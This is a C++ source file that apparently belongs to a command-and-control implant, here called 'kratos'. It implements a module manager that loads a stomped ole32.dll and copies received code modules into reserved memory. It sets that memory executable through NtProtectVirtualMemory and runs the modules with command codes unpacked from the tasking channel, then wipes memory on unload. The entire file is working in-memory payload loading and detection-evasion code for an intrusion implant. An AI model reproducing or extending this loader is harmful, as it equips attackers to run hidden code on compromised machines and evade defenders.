#include "modules/modules.h"
#include "packager/packager.h"


Modules* modules = NULL;




BOOL Modules::IsModuleLoaded(INT32 bit) {
	if ( bit < 0 || bit >= MAX_MODULES ) { return FALSE; }
	return ( this->LoadModulesBitMap >> bit ) & 1u;
}


BOOL Modules::LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit) {
	if ( ! Module || ModuleSize == 0 ) { return FALSE; }
	if ( ModuleBit < 0 || ModuleBit >= MAX_MODULES ) { return FALSE; }
	if ( this->IsModuleLoaded( ModuleBit ) ) { return FALSE; }

	if ( ! this->IsStompedDllLoaded ) {
		DEBUG_LOG("[+] Loading ole32.dll");

		if ( ! this->LoadStompedDll( ) ) { DEBUG_LOG("[!] Failed loading dll"); return FALSE; }
		DEBUG_LOG("[+] Loaded ole32.dll");

	}

	SIZE_T NeedSize = PAGE_ALIGN( ModuleSize );
	if ( NeedSize < ModuleSize ) { return FALSE; }
	SIZE_T SlotSize = NeedSize <= MODULE_SLOT_SIZE ? MODULE_SLOT_SIZE : NeedSize;

	ModuleInformation* info = this->FindModInfoEntry( ModuleBit );
	PVOID ModuleBaseToWrite = NULL;
	SIZE_T Capacity = 0;

	if ( info && info->EntryPoint && NeedSize <= info->ModuleSizeInMemory ) {
		ModuleBaseToWrite = info->EntryPoint;
		Capacity = info->ModuleSizeInMemory;
	} else {
		if ( info && info->EntryPoint ) {
			PVOID OldBase = info->EntryPoint;
			SIZE_T OldSize = info->ModuleSizeInMemory;
			DWORD OldProtect = 0;

			if ( ! NTAPI_SUCCESS( kratos->apis.NtProtectVirtualMemory( GetCurrentProcess( ), &OldBase, &OldSize, PAGE_READWRITE, &OldProtect ) ) ) {
				return FALSE;
			}
			utils::mem::memset( OldBase, 0, OldSize );
			kratos->apis.NtProtectVirtualMemory( GetCurrentProcess( ), &OldBase, &OldSize, PAGE_NOACCESS, &OldProtect );

			info->EntryPoint = NULL;
			info->ModuleSize = 0;
			info->ModuleSizeInMemory = 0;
		}

		if ( ! info ) {
			info = this->FindFreeModInfo( );
			if ( ! info ) { return FALSE; }
			info->id = ModuleBit;
		}

		ModuleBaseToWrite = this->ReserveArena( SlotSize );
		if ( ! ModuleBaseToWrite ) { return FALSE; }

		info->EntryPoint = ModuleBaseToWrite;
		info->ModuleSize = 0;
		info->ModuleSizeInMemory = SlotSize;
		Capacity = SlotSize;
	}

	DWORD old = 0;
	PVOID ProtectBase = ModuleBaseToWrite;
	SIZE_T ProtectSize = Capacity;

	NTSTATUS stat = kratos->apis.NtProtectVirtualMemory( GetCurrentProcess(), &ProtectBase, &ProtectSize, PAGE_READWRITE, &old );
	if ( ! NTAPI_SUCCESS( stat ) ) { return FALSE; }

	utils::mem::memset( ModuleBaseToWrite, 0, Capacity );
	utils::mem::memcpy( ModuleBaseToWrite, Module, ModuleSize );
	info->ModuleSize = ModuleSize;

	ProtectBase = ModuleBaseToWrite;
	ProtectSize = Capacity;
	stat = kratos->apis.NtProtectVirtualMemory( GetCurrentProcess(), &ProtectBase, &ProtectSize, PAGE_EXECUTE_READ, &old );
	if ( ! NTAPI_SUCCESS( stat ) ) { return FALSE; }

	kratos->apis.NtFlushInstructionCache( GetCurrentProcess( ), ModuleBaseToWrite, Capacity );
	this->UpdateBitField( ModuleBit );

	return TRUE;
}



BOOL Modules::RunModuleCommand(INT32 ModuleBit) {
	if ( ModuleBit < 0 || ModuleBit >= MAX_MODULES || ! this->IsModuleLoaded(ModuleBit) ) {
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_NOT_LOADED);
		return FALSE;
	}

	ModuleInformation* info = this->FindModInfoEntry(ModuleBit);
	if ( ! info || ! info->EntryPoint ) {
		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_NOT_LOADED);
		return FALSE;
	}

	auto CmdCode = packager->UnPack4( );

	((ModuleEntry)info->EntryPoint)(this->ModuleStruct, CmdCode);

	return TRUE;
}



BOOL Modules::UnLoadModule(INT32 ModuleBit) {
	if ( ModuleBit < 0 || ModuleBit >= MAX_MODULES ) { return FALSE; }
	if ( ! this->IsModuleLoaded( ModuleBit ) ) { return FALSE; }

	ModuleInformation* info = this->FindModInfoEntry( ModuleBit );
	if ( ! info || ! info->EntryPoint || info->ModuleSizeInMemory == 0 ) {
		this->ClearBitField( ModuleBit );
		return FALSE;
	}

	PVOID Base = info->EntryPoint;
	SIZE_T Size = info->ModuleSizeInMemory;
	DWORD OldProtect = 0;

	if ( ! NTAPI_SUCCESS( kratos->apis.NtProtectVirtualMemory( GetCurrentProcess( ), &Base, &Size, PAGE_READWRITE, &OldProtect ) ) ) {
		DEBUG_LOG("[!] Failed making module memory writable");
		return FALSE;
	}

	utils::mem::memset( info->EntryPoint, 0, info->ModuleSizeInMemory );
	info->ModuleSize = 0;

	Base = info->EntryPoint;
	Size = info->ModuleSizeInMemory;
	kratos->apis.NtProtectVirtualMemory( GetCurrentProcess( ), &Base, &Size, PAGE_NOACCESS, &OldProtect );
	kratos->apis.NtFlushInstructionCache( GetCurrentProcess( ), info->EntryPoint, info->ModuleSizeInMemory );

	this->ClearBitField( ModuleBit );
	return TRUE;
}



INT64 Modules::GetLoadedModulesBitMap() {
	return this->LoadModulesBitMap;
}


void Modules::UpdateBitField(INT32 Bit) {
	this->LoadModulesBitMap |= (1ULL << Bit);
}

void Modules::ClearBitField(INT32 Bit) {
	this->LoadModulesBitMap &= ~(1ULL << Bit);
}